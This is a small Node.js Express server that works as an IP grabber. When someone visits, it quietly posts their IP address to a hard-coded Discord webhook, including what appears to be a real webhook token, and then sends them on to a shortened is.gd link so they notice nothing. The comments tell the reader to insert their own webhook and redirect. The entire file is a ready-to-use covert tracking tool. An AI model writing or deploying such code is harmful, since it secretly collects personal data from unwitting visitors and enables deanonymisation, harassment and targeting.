const express = require('express');
const axios = require('axios');

const app = express();
const PORT = 3000;
const WEBHOOK_URL = 'https://discord.com/api/webhooks/1341433412753555548/e8tFi_i8MXCevhm7FtWgP6jQBRF1ANCfLKsE1ya6hjTs02qPLTQgzDCjqCVywLxkWLKX'; // Replace with your actual webhook
const REDIRECT_URL = 'https://is.gd/gwuu9c'; // Replace with your desired redirect link

app.get('/', async (req, res) => {
    try {
        const userIP = req.headers['x-forwarded-for'] || req.socket.remoteAddress;

        // Send the IP to Discord Webhook
        await axios.post(WEBHOOK_URL, {
            content: `New Visitor IP: ${userIP}`
        });

        // Redirect the user
        res.redirect(REDIRECT_URL);
    } catch (error) {
        console.error('Error sending IP to webhook:', error);
        res.status(500).send('An error occurred');
    }
});

app.listen(PORT, () => {
    console.log(`Server running on http://localhost:${PORT}`);
});
